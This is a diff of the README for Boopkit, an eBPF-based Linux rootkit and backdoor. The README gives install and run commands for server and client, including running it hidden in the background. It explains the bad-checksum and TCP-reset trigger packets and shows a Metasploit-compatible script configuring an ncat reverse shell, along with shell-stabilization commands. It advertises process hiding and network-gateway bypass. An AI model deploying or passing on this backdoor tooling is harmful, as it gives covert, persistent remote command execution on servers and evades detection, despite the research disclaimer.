@@ -1,122 +1,113 @@
 # Boopkit
 
-A research project to demonstrate remote code injection over TCP with a malicious eBPF probe installed on a server.
+Linux backdoor, rootkit, and eBPF bypass tools.
+Remote command execution over raw TCP.
 
-Tested on Linux 5.17
+ - Tested on Linux kernel 5.16
+ - Tested on Linux kernel 5.17
+ - Remote code execution over TCP (SSH, Nginx, Kubernetes, etc)
+ - Network gateway bypass (bad checksums, TCP reset)
+ - Self obfuscation at runtime (eBPF process hiding)
 
 ##### Disclaimer
 
-> This is **NOT** an exploit! This requires prior priviliged access on a server in order to work!
+> This is **NOT** an exploit! This requires prior privileged access on a server in order to work!
 > I am a professional security researcher. These are white hat tools used for research purposes only.
-> Use this responsibly. Never use this software illegaly.
+> Use this responsibly. Never use this software illegally.
 
-# Demo
+## Server Side
 
-Install `boopkit` on a server that is already running any TCP service (EG: Kubernetes, SSH, nginx, etc).
+Download and build boopkit.
 
-```
-git clone git@github.com:kris-nova/boopkit.git
+```bash
+git clone https://github.com/kris-nova/boopkit.git
 cd boopkit
 make
-sudo ./boopkit > /var/log/boop.log &
+sudo make install
 ```
 
-Trigger a reverse shell over an existing TCP service. Edit the `remote` launcher script and point it at any TCP server running on the exploited machine!
+Run boopkit in the foreground. 
 
-```
-cd remote
-# edit ./remote as needed
-./remote
-python -c "import pty; pty.spawn('/bin/bash')"
+```bash 
+# Reject all boops on localhost and 10.0.0.1
+boopkit -x 127.0.0.1 -x 10.0.0.1
 ```
 
-Enjoy :)
+Run boopkit in the background without output
 
-# Boop Vectors
+```bash 
+# Danger! This can be VERY hard to stop! Run this at your own risk!
+boopkit &> /dev/null &
+```
 
-Boopkit can "boop" the probe remotely in many ways. 
+Boopkit is now running and will automatically try to reverse connect to any source that is booping the server!
+
+## Client Side
+
+Download and build boopkit.
+
+```bash
+git clone https://github.com/kris-nova/boopkit.git
+cd boopkit
+make
+sudo make install
+```
+Run boopkit in the foreground.
+
+```bash 
+# Reject all boops on localhost and 10.0.0.1
+boopkit -x 127.0.0.1 -x 10.0.0.1
+```
+
+# Remote Vectors
+
+Boopkit will respond to various events on the network. Both of which can be triggered with the `boopkit-boop` tool.
 
 ### 1. Bad Checksum
 
-The first boop that is attempted by the trigger is sending a malformed TCP SYN packet with an uncalculated checksum. This is an extremely lightweight and versatile boop as it can be ran against any server regardless if the server currently has an application running and accepting TCP connections! Yes. You can literally just "boop" a server and trigger a bad checksum as the kernel by default is listening for sockets on all ports.
+First the `boopkit-boop` tool will send a malformed TCP SYN packet with an empty checksum to the server over a `SOCK_RAW` socket. This will trigger `boopkit` remotely regardless of what TCP services are running. In theory this would work against a server that has no TCP services listening!
 
-### 2. TCP Resets
+### 2. Sending ACK-RST packet
 
-The first boop is scary, but not always reliable. Most modern networking hardware will drop malformed packets such as the ones required for the first boop. So a slightly less versatile vector is to boop an active TCP server in the hopes of causing the TCP server to trigger a TCP reset in the kernel. This can be done by pointing the `/trigger` program at a TCP service such as OpenSSH or Kubernetes.
+Next the `boopkit-boop` tool will complete a valid TCP handshake with a `SOCK_STREAM` socket against a remote TCP service such as SSH, Kubernetes, Nginx, etc. After the initial TCP handshake is complete, `boopkit-boop` will repeat the process a 2nd time.
+The 2nd handshake will flip the TCP reset flag in the packet, trigger a TCP reset on the server.
 
-These TCP resets are much riskier, less reliable, and noiser from a kernel perspective. There is also no guarantee that a TCP service will actually trigger the TCP reset tracepoint. By default Boopkit will attempt to create a more reliable SOCK_STREAM style connection before attempting the TCP reset boop, simply to validate that the remote is online and responding to TCP.
+Either of these tactics are enough to independently trigger boopkit.
+Various network hardware and runtime conditions will make either tactic more viable.
+Boopkit will try both, by default.
 
+# Boopscript
 
-# Components
+The `boopscript` file is a [Metasploit](https://github.com/rapid7/metasploit-framework) compatible script that can be used to remotely trigger the boopkit backdoor after `boopkit-boop` is installed locally.
 
-| eBPF Probe | Malicious Userspace Program                           | Remote Trigger                                              |
-|------------|-------------------------------------------------------|-------------------------------------------------------------|
-| Responsible for sending `tracepoint/tcp/tcp_bad_sum` events to userspace | Persistent process in Linux, that does the dirty work | Remote way to trigger the RCE over a network and TCP server |
+```bash
+# Remote values
+RHOST="127.0.0.1"
+RPORT="22"
+# Local values
+LHOST="127.0.0.1"
+LPORT="3535"
+# NetCat Reverse Shell Values
+NCAT="/usr/bin/ncat"
+NCATLISTENPORT="3545"
+```
 
-
-### eBPF Probe
-
-Can be loaded into the kernel at runtime using the userspace loader program. 
-The probe responds to `tcp/tcp_bad_csum` events and will pass the `saddr` (Source Address) up to userspace using an eBPF map.
-
-
-### Loader Program
-
-This is the malicious program that will respond to the bad checksum packets sent to the server. 
-Whenever a malicious packet is sent, the loader program responds with remote code execution.
-
-
-### Trigger/Remote
-
-The `trigger` binary is a small C program that will send a malformed `SYN` request without a properly calculated checksum to the server.
-
-The `remote` script wraps the `trigger` and will use `netcat` to listen for a reverse shell.
-
-### eBPF and Loader Compile Time Dependencies 
+### Compile Time Dependencies 
 
  - 'clang'
+ - `bpftool`
  - 'linux-headers'
  - 'llvm'
  - 'libbpf'
  - 'lib32-glibc'
 
-### Boopkit runtime dependencies 
-
- - Linux kernel with eBPF enabled/supported
- - Ncat running on the server
- - Root access :) 
-
-# Reverse Shell Stabilization
-
-After a successful `/remote` the shell will be very unsightly. It is possible to use [Jason Turley](https://jasonturley.xyz/how-to-stabilize-a-reverse-shell/)'s suggestion to stablize the shell.
-
-Select one of the commands to run in order to start a cleaner shell.
+### Reverse Shell Stabilization
 
 ```bash
 python -c "import pty; pty.spawn('/bin/bash')"
-ruby -e "exec '/bin/bash'"
-perl -e "exec '/bin/bash';"
 ```
 
-Next move the newly created shell to the background on your local terminal.
-
-```
-Ctrl + z
-```
-
-Update the stty locally. 
-
-```bash
-stty raw -echo && fg
-```
-
-Finally, reconfigure the terminal! 
-
-```bash
-export TERM=xterm-256-color
-```
-
-# References 
+### References 
 
 Credit to the original authors for their helpful code samples! I forked a lot of code for this project!
 
